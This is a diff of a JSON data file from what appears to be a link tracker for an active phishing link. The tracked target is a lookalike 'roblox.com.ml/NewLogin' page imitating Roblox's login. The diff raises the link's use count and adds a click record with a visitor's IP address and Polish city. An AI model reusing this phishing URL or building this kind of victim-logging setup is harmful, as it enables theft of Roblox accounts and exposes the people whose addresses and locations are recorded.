@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 543,
+    "useCount": 544,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4451,6 +4451,14 @@
       },
       {
         "timestamp": 1777094866803,
+        "ip": "46.205.206.10",
+        "country": "Poland",
+        "city": "Szczecin",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777094895002,
         "ip": "46.205.206.10",
         "country": "Poland",
         "city": "Szczecin",
